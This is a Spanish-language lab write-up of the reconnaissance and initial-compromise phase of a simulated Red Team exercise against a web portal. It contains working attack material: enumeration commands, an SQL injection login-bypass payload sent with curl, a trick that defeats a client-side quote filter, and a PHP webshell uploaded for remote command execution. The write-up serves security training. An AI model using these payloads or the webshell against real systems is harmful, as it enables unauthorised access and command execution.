# Fase de reconocimiento y compromiso inicial del portal web

## Contexto del escenario

El laboratorio simula una intrusión Red Team contra una pequeña infraestructura empresarial. El atacante únicamente dispone de conectividad con el servidor web expuesto, desconociendo inicialmente la existencia de una red interna o de un entorno Active Directory.

La primera fase del ejercicio consiste en realizar una enumeración progresiva del servicio web con el objetivo de identificar funcionalidades interesantes, descubrir recursos ocultos y obtener un punto de entrada inicial.

---

## Enumeración inicial

La primera tarea consiste en identificar los servicios expuestos.

```bash
nmap -sV -sC -p- 192.168.129.129
```

El análisis muestra la presencia de un servidor Apache accesible a través del puerto 8080.

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd
```

Accediendo mediante navegador:

```text
http://192.168.129.129:8080/
```

se observa un portal corporativo aparentemente destinado a la gestión de clientes y tickets.

---

## Enumeración de directorios

A continuación se realiza una búsqueda de recursos ocultos mediante FFUF.

```bash
ffuf \
-u http://192.168.129.129:8080/FUZZ \
-w /usr/share/wordlists/dirb/common.txt \
-e .php,.txt,.html,.sql,.css,.jpg,.png \
-recursion \
-recursion-depth 2 \
-fc 403 \
-c \
-o resultado.json \
-of json
```

Posteriormente, un script desarrollado específicamente para el laboratorio permite reconstruir la estructura del sitio web a partir del fichero JSON generado.

```bash
python3 ffuf_tree.py resultado.json
```

La estructura descubierta es:

```text
.
├── assets
│   └── css
│       └── style.css
├── backend
│   └── panel.php
├── clientes.php
├── config
│   └── db.php
├── css
├── dashboard.php
├── includes
│   ├── footer.php
│   └── header.php
├── index.php
├── login.php
├── logout.php
├── ticket.php
└── uploads
    ├── prueba.png
    ├── shell.php
    └── terminal.php
```

Durante esta fase llaman especialmente la atención los siguientes recursos:

* `/config/db.php`
* `/backend/panel.php`
* `/uploads/`

La existencia de un directorio de subida de ficheros accesible públicamente constituye un indicador de posible vulnerabilidad.

---

## Análisis del mecanismo de autenticación

La página de autenticación se encuentra en:

```text
http://192.168.129.129:8080/login.php
```

La petición capturada mediante Burp Suite es:

```http
POST /login.php HTTP/1.1

username=admin&password=test
```

Sin embargo, se observa que independientemente del usuario empleado:

* el servidor devuelve código HTTP 200;
* la longitud de la respuesta permanece constante;
* no existen redirecciones;
* no se generan cookies diferentes.

Por tanto, Burp Intruder no permite distinguir usuarios válidos mediante los criterios habituales.

---

## Enumeración diferencial de usuarios

Ante la ausencia de diferencias evidentes, se desarrolla una herramienta inspirada en Burp Intruder capaz de analizar:

* código HTTP;
* longitud de la respuesta;
* hash del contenido;
* cookies;
* redirecciones;
* tiempo de respuesta.

Para ello se emplea la wordlist:

```text
/usr/share/seclists/Usernames/cirt-default-usernames.txt
```

con un total de 828 usuarios.

Los resultados obtenidos fueron:

```text
Tiempo mínimo : 0.00306 s
Tiempo máximo : 0.60528 s
Tiempo medio  : 0.00520 s
Desviación estándar : 0.02090 s
Umbral temporal : 0.06792 s

Longitud mínima : 2161 bytes
Longitud máxima : 2161 bytes
Longitud media  : 2161 bytes

Código HTTP más frecuente : 200
Hash más frecuente :
ac84078715bc50a8f8f70e448dce0a45
```

Dado que todas las respuestas presentaban exactamente la misma longitud, se descartó la existencia de una vulnerabilidad de enumeración basada en:

* códigos HTTP;
* tamaño de respuesta;
* redirecciones;
* cookies.

No obstante, apareció una anomalía temporal significativa para un único usuario:

```text
system_admin
```

con un tiempo medio de:

```text
0.60528 s
```

frente a los aproximadamente:

```text
0.005 s
```

del resto de usuarios.

Este comportamiento sugería que la aplicación realizaba un procesamiento adicional cuando el nombre de usuario existía en la base de datos, constituyendo una vulnerabilidad de enumeración de usuarios basada en diferencias temporales.

Toda la información obtenida fue almacenada en un fichero CSV para facilitar su análisis posterior.

---

## Pruebas de SQL Injection

Una vez identificado el posible usuario válido `system_admin`, se procede a comprobar si el formulario de autenticación es vulnerable a SQL Injection.

Durante el análisis del código fuente del formulario se identifica un filtro JavaScript aplicado al campo de usuario:

```html
<script>
function badUsernameFilter(input) {
    if (input.value.includes("'") || input.value.includes("#")) {
        input.value = input.value.replace("'", "");
        input.value = input.value.replace("#", "");
    }
}
</script>
```

Este filtro elimina los caracteres ' y # cuando el usuario los introduce desde el navegador. Sin embargo, se trata de una validación realizada únicamente en el lado cliente, por lo que no constituye una medida de seguridad efectiva. Un atacante puede evitarla enviando la petición directamente al servidor mediante herramientas como curl, Burp Suite o SQLMap.

La prueba mediante curl permite enviar el payload sin pasar por el filtro JavaScript del navegador:

```bash
curl -i -X POST \
http://<IP_SERVIDOR>:8080/login.php \
-d "username=system_admin'-- -&password=test"
```
El payload utilizado es:

```
system_admin'-- -
```

La comilla simple cierra la cadena del nombre de usuario en la consulta SQL y la secuencia -- - comenta el resto de la consulta, anulando la comprobación de la contraseña.

Además, se comprueba que el filtro puede ser eludido también desde el propio formulario web introduciendo una doble comilla simple:

```
system_admin''-- -
```

En este caso, el filtro JavaScript elimina únicamente una de las comillas simples, dejando finalmente el payload efectivo:

```
system_admin'-- -
```

De esta forma, aunque el formulario intenta bloquear caracteres peligrosos en el navegador, la protección resulta insuficiente. La validación debería realizarse en el servidor y las consultas SQL deberían construirse mediante consultas preparadas o parametrizadas.

La explotación confirma que es posible autenticarse como el usuario system_admin sin conocer su contraseña, obteniendo acceso al panel interno de la aplicación.

<div align="center">

<p><strong>Explotación del login mediante SQL Injection</strong></p>

<video src="./img/vulneracion-login-sqli.mp4" controls width="800"></video>

</div>
## Análisis del directorio uploads

Durante la enumeración previa se había identificado el directorio:

```text
/uploads/
```

La presencia de archivos como:

```text
shell.php
terminal.php
```

hace sospechar de una vulnerabilidad de subida de archivos.

Se crea una webshell sencilla:

```php
<?php
system($_GET['cmd']);
?>
```

guardándola como:

```text
shell.php
```

Tras subir el archivo, se verifica su ejecución mediante:

```text
http://<IP_SERVIDOR>:8080/uploads/shell.php?cmd=id
```

obteniéndose:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

confirmando la existencia de ejecución remota de comandos.
